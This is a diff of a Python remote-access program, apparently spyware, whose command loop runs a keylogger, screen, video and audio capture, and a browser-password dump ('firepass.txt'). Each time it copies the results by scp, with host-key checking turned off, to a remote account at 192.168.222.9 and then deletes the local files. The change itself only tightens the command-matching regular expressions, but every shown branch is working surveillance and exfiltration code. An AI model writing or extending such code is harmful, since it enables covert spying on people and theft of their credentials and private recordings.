@@ -53,28 +53,28 @@ while True:
 		os.system('rm -f /tmp/firepass.txt')
 		connstream.send("Archivo enviado")
 
-	elif re.search('keylogger',recibido):
+	elif re.search('keylogger (\d+)',recibido):
 		mo = re.match('keylogger (\d+)',recibido)
 		keylogger.keylog(mo.group(1))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.9:~/keylogger/ 1>/dev/null')
 		os.system('rm -f /tmp/key.txt')
 		connstream.send("Archivo enviado")
     
-	elif re.search('captura',recibido):
+	elif re.search('captura (\-[tn]{1,1}) (\d+)',recibido):
 		mo = re.match('captura (\-[tn]{1,1}) (\d+)',recibido);
 		captura.tiempo(mo.group(1),mo.group(2))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.png manavi@192.168.222.9:~/capturas/ 1>/dev/null')
 		os.system('rm -f /tmp/*.png')
 		connstream.send("Archivo enviado")
  
-	elif re.search('captvid',recibido):
+	elif re.search('captvid (\d+)',recibido):
 		mo = re.match('captvid (\d+)',recibido);
 		capvideo.video(mo.group(1))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.9:~/video/ 1>/dev/null')
 		os.system('rm -f /tmp/*.mpeg')
 		connstream.send("Archivo enviado")
     
-	elif re.search('captaud',recibido):
+	elif re.search('captaud (\d+)',recibido):
 		mo = re.match('captaud (\d+)',recibido);        
 		capaudio.audio(mo.group(1))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.9:~/audio/ 1>/dev/null')
